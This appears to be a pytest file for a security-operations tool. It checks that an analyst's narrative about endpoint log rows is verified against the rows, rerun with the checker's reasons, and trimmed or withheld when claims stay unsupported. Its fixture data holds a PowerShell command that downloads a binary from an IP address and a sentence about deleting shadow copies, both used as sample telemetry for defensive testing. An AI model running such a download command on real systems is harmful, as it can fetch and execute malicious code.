"""B51: the narrative checked against the rows, the sub-analyst sent back with the
checker's reasons, and what still fails dropped or withheld."""

from __future__ import annotations

import asyncio

from contracts import DomainFinding, ResultSet

from smartops.subagent_analysts import analyze
from smartops.subagent_analysts.analyze import MAX_NARRATIVE_RERUNS, _as_record, _check_narrative
from smartops.subagent_analysts.routing import DomainSlice
from smartops.subagent_analysts.verify import Verdict, _prompt

_ROWS = [{"host": "HOST-1", "process": "powershell.exe Invoke-WebRequest http://192.168.77.211/update/a.bin"}]
GOOD = "HOST-1 ran powershell.exe."
BAD = "Processes#1 shows cmd.exe deleting shadow copies."
FIXED = "Processes#1 shows powershell.exe."


def _slice() -> DomainSlice:
    return DomainSlice(domain="endpoint", siem_sets=[("processes", ResultSet(query="q", row_count=1, rows=_ROWS))])


def _finding(narrative: str) -> DomainFinding:
    return DomainFinding(domain="endpoint", narrative=narrative, observations=["o [processes#1]"],
                         citations=["processes#1"], prompt_tokens=1, generation_tokens=1)


class _Verifier:
    """`bad` sentences are unsupported on every call; `skip` returns None."""

    def __init__(self, bad: set[str] = frozenset(), skip: bool = False):
        self.bad, self.skip, self.calls = bad, skip, []

    async def __call__(self, claims):
        self.calls.append([line for line, _ in claims])
        if self.skip:
            return None
        return [Verdict(index=i, supported=line not in self.bad, reason="" if line not in self.bad else "rows say powershell.exe")
                for i, (line, _) in enumerate(claims)]


def _run(finding, verifier, monkeypatch, reruns=()):
    """`reruns` are the narratives the sub-analyst writes on each rerun; feedback is captured."""
    feedback, queue = [], list(reruns)

    def fake(model, scope, slice_, fb=""):
        feedback.append(fb)
        return _finding(queue.pop(0))

    monkeypatch.setattr(analyze, "gather_finding", fake)
    out = asyncio.run(_check_narrative(finding, _slice(), None, None, verifier))
    return out, feedback


def test_a_supported_narrative_is_untouched_and_marked_checked(monkeypatch):
    out, feedback = _run(_finding(f"{GOOD} {FIXED}"), _Verifier(), monkeypatch)
    assert out.narrative == f"{GOOD} {FIXED}" and out.narrative_check == "checked"
    assert feedback == [] and out.narrative_original == ""


def test_an_unsupported_sentence_sends_the_analyst_back_with_the_reason(monkeypatch):
    verifier = _Verifier({BAD})
    out, feedback = _run(_finding(f"{GOOD} {BAD}"), verifier, monkeypatch, reruns=[f"{GOOD} {FIXED}"])
    assert out.narrative == f"{GOOD} {FIXED}" and out.narrative_check == "checked"
    assert len(feedback) == 1 and BAD in feedback[0] and "rows say powershell.exe" in feedback[0]
    assert out.narrative_original == f"{GOOD} {BAD}"
    assert out.narrative_unsupported == [f"round 0: {BAD} -- rows say powershell.exe"]
    assert out.prompt_tokens == 2  # the rerun's tokens are added, not replaced


def test_a_sentence_still_unsupported_after_the_last_rerun_is_dropped(monkeypatch):
    out, feedback = _run(_finding(f"{GOOD} {BAD}"), _Verifier({BAD}), monkeypatch,
                         reruns=[f"{GOOD} {BAD}"] * MAX_NARRATIVE_RERUNS)
    assert len(feedback) == MAX_NARRATIVE_RERUNS
    assert out.narrative == GOOD
    assert out.narrative_check == "checked; 1 sentence(s) dropped"
    assert len(out.narrative_unsupported) == MAX_NARRATIVE_RERUNS + 1


def test_a_skipped_check_withholds_the_narrative_and_keeps_the_original(monkeypatch):
    out, feedback = _run(_finding(f"{GOOD} {BAD}"), _Verifier(skip=True), monkeypatch)
    assert out.narrative == "" and out.narrative_original == f"{GOOD} {BAD}"
    assert out.narrative_check.endswith("narrative withheld") and feedback == []
    assert out.observations == ["o [processes#1]"]  # only the narrative is held back


def test_a_withheld_narrative_leaves_a_code_written_notice_not_an_empty_domain(monkeypatch):
    out, _ = _run(_finding(GOOD), _Verifier(skip=True), monkeypatch)
    record = _as_record(out, _slice())
    assert record.narrative == "" and any(f.startswith("narrative withheld") for f in record.facts)


def test_an_empty_narrative_is_not_checked(monkeypatch):
    verifier = _Verifier()
    out, _ = _run(_finding(""), verifier, monkeypatch)
    assert verifier.calls == [] and out.narrative_check == ""


def test_a_sentence_naming_a_set_is_sent_with_that_sets_rows_and_others_with_all_rows(monkeypatch):
    seen = {}

    async def verify(claims):
        seen.update(dict(claims))
        return [Verdict(index=i, supported=True) for i in range(len(claims))]

    _run(_finding(f"{GOOD} {FIXED}"), verify, monkeypatch)
    assert "192.168.77.211" in seen[FIXED] and "192.168.77.211" in seen[GOOD]


def test_identical_rows_are_printed_once_in_the_verify_prompt():
    prompt = _prompt([("a", "ROWS-X"), ("b", "ROWS-X"), ("c", "ROWS-Y")])
    assert prompt.count("ROWS-X") == 1 and "same as claim 0" in prompt and prompt.count("ROWS-Y") == 1
